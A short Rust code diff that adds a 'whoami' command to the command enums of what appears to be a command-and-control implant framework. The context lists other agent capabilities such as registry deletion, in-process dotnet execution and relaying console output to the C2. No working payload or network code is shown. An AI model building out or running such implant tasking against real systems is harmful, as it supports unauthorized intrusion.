@@ -50,6 +50,7 @@ pub enum Command {
     RegDelete,
     /// Execute dotnet in current process
     DotEx,
+    WhoAmI,
     /// Messages we intercepted from the console to be sent to the c2
     ConsoleMessages,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
@@ -189,6 +190,7 @@ impl Display for Command {
             Command::RmDir => "RmDir",
             Command::DotEx => "DotEx",
             Command::ConsoleMessages => "Agent console messages",
+            Command::WhoAmI => "whoami",
         };
 
         write!(f, "{choice}")
@@ -241,6 +243,7 @@ pub enum AdminCommand {
     /// Exports the completed tasks database for an agent.
     ExportDb,
     DotEx(DotExInner),
+    WhoAmI,
     /// Used for dispatching no admin command, but to be handled via a custom route on the C2
     None,
     Undefined,
